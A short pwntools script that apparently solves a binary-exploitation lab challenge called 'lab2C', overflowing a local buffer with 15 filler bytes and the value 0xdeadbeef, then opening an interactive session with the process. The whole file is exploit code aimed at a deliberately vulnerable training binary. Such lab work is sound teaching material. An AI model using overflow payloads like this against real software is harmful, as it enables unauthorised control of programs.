from pwn import *
chall = ELF("./lab2C")
payload = b"A"*15 + p32(0xdeadbeef)
s = process(["./lab2C", payload])
s.interactive()
